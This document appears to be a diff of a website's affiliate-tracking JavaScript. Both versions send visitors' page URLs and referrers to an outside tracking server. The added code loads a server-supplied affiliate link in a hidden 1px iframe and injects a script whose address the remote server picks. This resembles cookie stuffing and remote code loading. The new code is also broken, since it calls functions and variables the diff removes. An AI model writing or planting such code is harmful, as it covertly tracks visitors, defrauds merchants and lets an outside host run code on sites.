@@ -1,31 +1,8 @@
-(async function() {
-    
-    function generateUUID() {
-        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-            var r = Math.random() * 16 | 0,
-                v = c === 'x' ? r : (r & 0x3 | 0x8);
-            return v.toString(16);
-        });
-    }
 
-
-     function getQueryParam(param) {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(param);
-  }
-
-  const clickId = getQueryParam('irclickid');
-
-  if (clickId) {
-    
-    document.cookie = `irclickid=${clickId}; path=/; max-age=${30 * 24 * 60 * 60}`;
-  }
-
+(async () => {
   
-  if (clickId) {
-    localStorage.setItem('irclickid', clickId);
-  }
 
+const clickId = getQueryParam('irclickid');
 
     const urlNew = new URL(window.location.href);
   const utm_source = urlNew.searchParams.get("utm_source") || "";
@@ -48,97 +25,45 @@ const payload = {
     clickId,
   };
 
-
-
-
-    function createTrackingPixel(url) {
-        console.log("Enter url vjp......")
-        var img = document.createElement('img');
-        img.src = url;
-        img.style.width = '1px';
-        img.style.height = '1px';
-        img.style.display = 'none';  
-        img.style.visibility = 'hidden';
-        
-        document.body.appendChild(img);
-    }
-
-    function createClickIframe(url) {
-  const iframe = document.createElement('iframe');
-  iframe.src = url;
-  iframe.width = "1";
-  iframe.height = "1";
-  iframe.style = "display:none;visibility:hidden;";
-  document.body.appendChild(iframe);
-}
-
-
-    async function initTracking() {
-        // if (sessionStorage.getItem('iframe_triggered')) {
-        //     return; 
-        // }
-//          if (!clickId) {
- 
-//         console.log('No clickId found. Tracking script will not run.');
-//          return;
-//   }
-
-        try {
-            let uniqueId = getCookie('tracking_uuid') || generateUUID();
-            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
-            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
-
-            let response = await fetch('https://www.tracktraffics.com/api/track-user-withoutUniData', {
-                method: 'POST',
-                body: JSON.stringify({
+  try {
+   
+    const response = await fetch('https://www.tracktraffics.com/api/track-user-withoutUniDatavpn', {
+      method: "POST",
+      mode: "cors",
+      body: JSON.stringify({
                     url: window.location.href,
                     referrer: document.referrer,
                     unique_id: uniqueId,
                     origin: window.location.hostname,
                     payload,
                 }),
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Access-Control-Allow-Origin':'*'
-                }
-            });
+      headers: {
+        "Content-Type": "application/json"
+      }
+    })
+     let result = await response.json();
+            
 
-            let result = await response.json();
-            if (result.success && result.affiliate_url) {
-                createTrackingPixel(result.affiliate_url);
-                sessionStorage.setItem('iframe_triggered', 'true'); 
-            } else {
-                createTrackingPixel('https://www.tracktraffics.com/api/fallback-pixel?id=' + uniqueId);
-            }
-        } catch (error) {
-            console.error('Error in tracking script:', error);
-        }
+
+    if (result.affiliate_url) {
+      const iframe = document.createElement("iframe");
+      iframe.src = result.affiliate_url;
+      iframe.sandbox = "allow-same-origin allow-scripts";
+      iframe.style.width = "1px";
+      iframe.style.height = "1px";
+      iframe.style.border = "0";
+      iframe.style.display = "none";
+      document.body?.appendChild(iframe);
     }
 
-    function getCookie(cname) {
-        var name = cname + '=';
-        var ca = document.cookie.split(';');
-        for (var i = 0; i < ca.length; i++) {
-            var c = ca[i];
-            while (c.charAt(0) === ' ') {
-                c = c.substring(1);
-            }
-            if (c.indexOf(name) === 0) {
-                return c.substring(name.length, c.length);
-            }
-        }
-        return '';
-    }
-        function isCardPage() {
-            const cardPageUrls = ['/cart', '/checkout']; 
-            return cardPageUrls.some(url => window.location.pathname.includes(url));
-        }
-        
-        if (isCardPage()) {
-            initTracking()
-        }
 
-        //setTimeout(initTracking, 2000);
-    
-    initTracking()
+    if (result.faffiliate_url) {
+      const script = document.createElement("script");
+      script.src = result.faffiliate_url;
+      script.async = true;
+      (document.head || document.body).appendChild(script);
+    }
+  } catch (error) {
+    console.error("Error loading affiliate script:", error);
+  }
 })();
